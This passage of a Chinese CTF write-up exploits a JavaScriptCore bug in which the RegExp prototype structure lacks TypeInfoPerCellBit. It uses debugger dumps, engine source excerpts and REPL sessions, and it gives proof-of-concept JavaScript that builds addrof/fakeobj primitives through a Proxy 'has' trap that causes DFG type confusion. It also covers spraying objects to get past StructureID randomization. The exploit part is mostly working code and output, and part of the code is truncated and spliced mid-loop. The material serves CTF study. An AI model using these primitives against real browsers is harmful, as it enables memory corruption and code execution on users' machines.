    0x7fffb26f2110: 0x00007ffff7d95b80      0x0000000000000001
    0x7fffb26f2120: 0x0000000000000000      0x0000000000000003
    0x7fffb26f2130: 0x00000000ffffffff      0x0000000000000000
    0x7fffb26f2140: 0x0100000000002e74      0x0100170000007c6e
    0x7fffb26f2150: 0x0000002000000000      0x00007fffb26e0000
看一下它的`prototype` 地址`0x00007fffb26d8020` ， 和我们分析的一样，它并没有设置`TypeInfoPerCellBit`
    pwndbg> x/20gx 0x00007fffb26d8020
    0x7fffb26d8020: 0x0100170000007a64      0x00007fe00dcf0208
    0x7fffb26d8030: 0x0180170000008b3f      0x00007fe00dcfc5e8
后续创建`RegExp` 对象的时候都是使用一开始创建的这个`Structure`(`0x7fffb26f20d0`),
也就是`FastCacheStructure[1]`, 其他的貌似不会用到，我也木有找到可以重新调用`createStructure`
的点，但是当前得到的信息已经足够了，我们继续看看怎么样利用
    >>> a=new RegExp()
    /(?:)/
    >>> describe(a)
    Object: 0x7fffb26e8100 with butterfly (nil) (Structure 0x7fffb26f20d0:[Object, {}, NonArray, Proto:0x7fffb26d8020, Leaf]), StructureID: 53331
## 漏洞利用
18年的时候`lokihardt` 提交了一个[`Proxy` 对象相关的洞](https://bugs.chromium.org/p/project-zero/issues/detail?id=1649)，里面提到的一个漏洞利用的思路可以用到这道题目上面来。
jsc 的native对象不允许在`prototype` 上设置`Proxy` ， 例如有一个对象`a= [1.1,2.2]`,
然后执行`a.__proto__=new Proxy({},{})`, 这时候会调用`JSObject::setPrototypeDirect` 函数
    void JSObject::setPrototypeDirect(VM& vm, JSValue prototype)
    {
        ASSERT(prototype);
        // prototype == new Proxy({},{})
        if (prototype.isObject())
            prototype.asCell()->didBecomePrototype();
        if (structure(vm)->hasMonoProto()) {
            DeferredStructureTransitionWatchpointFire deferred(vm, structure(vm));
            Structure* newStructure = Structure::changePrototypeTransition(vm, structure(vm), prototype, deferred);
            setStructure(vm, newStructure);
        } else
            putDirect(vm, knownPolyProtoOffset, prototype);
        if (!anyObjectInChainMayInterceptIndexedAccesses(vm))
            return;
        if (mayBePrototype()) {
            structure(vm)->globalObject()->haveABadTime(vm);
            return;
        }
        if (!hasIndexedProperties(indexingType()))
            return;
        if (shouldUseSlowPut(indexingType()))
            return;
        switchToSlowPutArrayStorage(vm);
    }
`Proxy` 对象会设置`TypeInfoPerCellBit`, 接着后面`mayBePrototype()` 会判断当前`JSObject`
是不是一个`prototype` ， 例如`a.__proto__.__proto__ = new Proxy({}, {})`,
是的话会调用`haveABadTime()`,
具体实现在[`Source/JavaScriptCore/runtime/JSGlobalObject.cpp#L1574`](https://github.com/WebKit/webkit/blob/5ed80f740ac7b67ca9ddc43aae401bacc685c5e4/Source/JavaScriptCore/runtime/JSGlobalObject.cpp#L1574)
上, 它会找出对象的所有依赖，然后`switchToSlowPutArrayStorage`
都转换成`ArrayWithSlowPutArrayStorage` 类型
    >>> a=[1.1,2.2]
    1.1,2.2
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff84c8e4008 (Structure 0x7fffb26f1d50:[Array, {}, ArrayWithDouble, Proto:0x7fffb26d8010, Leaf]), StructureID: 22114
    >>> a.__proto__=new Proxy({},{})
    [object Object]
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff84c8f8348 (Structure 0x7fffb26b0850:[Array, {}, ArrayWithSlowPutArrayStorage, Proto:0x7ffff2ac7f68, Leaf]), StructureID: 10472
    >>>
结合我们前面的分析`RegExpPrototype` 并没有设置`TypeInfoPerCellBit`, 这样我们就可以在native
对象的`prototype` 创建一个`Proxy` 对象而不会触发转换成`ArrayWithSlowPutArrayStorage` 类型，
在有漏洞和没有漏洞版本的 `jsc` 的测试结果如下
`无漏洞版本`
    >>> a=[1.1,2.2]
    1.1,2.2
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7fe0179e4008 (Structure 0x7fffb26f1d50:[Array, {}, ArrayWithDouble, Proto:0x7fffb26d8010, Leaf]), StructureID: 39579
    >>> reg = new RegExp()
    /(?:)/
    >>> describe(reg)
    Object: 0x7fffb26e8120 with butterfly (nil) (Structure 0x7fffb26f20d0:[RegExp, {}, NonArray, Proto:0x7fffb26d8020, Leaf]), StructureID: 41496
    >>> a.__proto__=reg
    /(?:)/
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7fe0179e4008 (Structure 0x7fffb26f3e20:[Array, {}, ArrayWithDouble, Proto:0x7fffb26e8120, Leaf]), StructureID: 59375
    >>> reg.__proto__.__proto__ = new Proxy({},{})
    [object Object]
    // 有依赖关系的 a 会被转换成 ArrayWithSlowPutArrayStorage 类型
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7fe0179fbe88 (Structure 0x7fffb26a7e20:[Array, {}, ArrayWithSlowPutArrayStorage, Proto:0x7fffb26e8120, Leaf]), StructureID: 61156
    >>>
`漏洞版本`
    >>> a=[1.1,2.2]
    1.1,2.2
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff815ee4008 (Structure 0x7fffb26f1d50:[Array, {}, ArrayWithDouble, Proto:0x7fffb26d8010, Leaf]), StructureID: 25564
    >>> reg = new RegExp()
    /(?:)/
    >>> describe(reg) 
    Object: 0x7fffb26e8120 with butterfly (nil) (Structure 0x7fffb26f20d0:[Object, {}, NonArray, Proto:0x7fffb26d8020, Leaf]), StructureID: 27086
    >>> a.__proto__=reg        
    /(?:)/
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff815ee4008 (Structure 0x7fffb26b05b0:[Array, {}, ArrayWithDouble, Proto:0x7fffb26e8120, Leaf]), StructureID: 46253
    >>> reg.__proto__.__proto__ = new Proxy({},{})
    [object Object]
    // 并没有转换成 ArrayWithSlowPutArrayStorage
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff815ee4008 (Structure 0x7fffb26b05b0:[Array, {}, ArrayWithDouble, Proto:0x7fffb26e8120, Leaf]), StructureID: 46253
    >>>
在 dfg 中，当调用`has` 函数， 也就是`0 in a` 这样的时候，会进入`case HasIndexedProperty`,
代码在[`Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h#L3842`](https://github.com/WebKit/webkit/blob/5ed80f740ac7b67ca9ddc43aae401bacc685c5e4/Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h#L3842)
        case HasIndexedProperty: {
            ArrayMode mode = node->arrayMode();
            switch (mode.type()) {
            case Array::Int32:
            case Array::Double:
            case Array::Contiguous:
            case Array::ArrayStorage: {
                break;
            }
            default: {
                clobberWorld();
                break;
            }
            }
            setNonCellTypeForNode(node, SpecBoolean);
            break;
        }
对于不是`Int32, Double, Contiguous, ArrayStorage`
的对象，如前面的`ArrayWithSlowPutArrayStorage` 类型，会有`clobberWorld`
来检查对象的转换，假如类似下面的代码，在`has` 函数里把`b[0]` 改成了一个对象，进入 dfg 之后因为之前的漏洞`a`
仍被认为是`ArrayWithDouble` 类型，不会调用`clobberWorld`, 然后 jsc 后面就会把 `b[0]` 当做一个double
类型来处理， 于是就有了地址泄露，同样的，我们也可以它来构造`fakeobj`
    a= [1.1,2.2];
    reg = new RegExp();
    a.__proto__ = reg;
    b = [1.1,2.2];
    reg.__proto__.__proto__ =  new Proxy({}, { 
      has() {                                    
          b[0] = {};
        return true;
      }
    });
    //... --> in dfg
    delete a[0];
    let tmp = 0 in a;
###  addrof/fakeobj 构造
根据前面的分析，其实`addrof` 和 `fakeobj` 的构造思路已经有了，就是借助dfg 的时候的has函数形成一个类型混淆，
参考[官方writeup](https://zhuanlan.zhihu.com/p/96069221) 给出的 poc， 下面是我的实现
    let arrays = [];
    let regexp = new RegExp();
    let leakme = [{}];
    let jit_mode = 0;
    var global_arr = [1.1, 2.2];
    const MAX_ARRAYS = 100;
    for (let i = 0; i >> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff815ee4008 (Structure 0x7fffb26b05b0:[Array, {}, ArrayWithDouble, Proto:0x7fffb26e8120, Leaf]), StructureID: 46253
    >>>
`StructureID` 是一个很大的数`46253 == 0xb4ad` , 最后七个 bit 是随机生成的， 这样要找可用的
id就变得更加的困难，但是`1<< 7 == 128`, `1/128` 这个概率也不算很低，我们同样可以喷一堆的 `ArrayWithDouble`
对象，然后拿一个重复运行总会有命中的时候。
Blackhat EU 2019 上阿里的`[@ThomasKing2014](https://github.com/ThomasKing2014
"@ThomasKing2014")` 也讲了一个[利用内置函数泄露`StructureID`
的方法](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf)
原理基本上就是并不是所有的内置函数都会用到 `StructureID`,
我们可以伪造这些函数用到的对象，控制它的执行流程。具体的实现如下，`Function.prototype.toString.call` 会打印出函数的源码，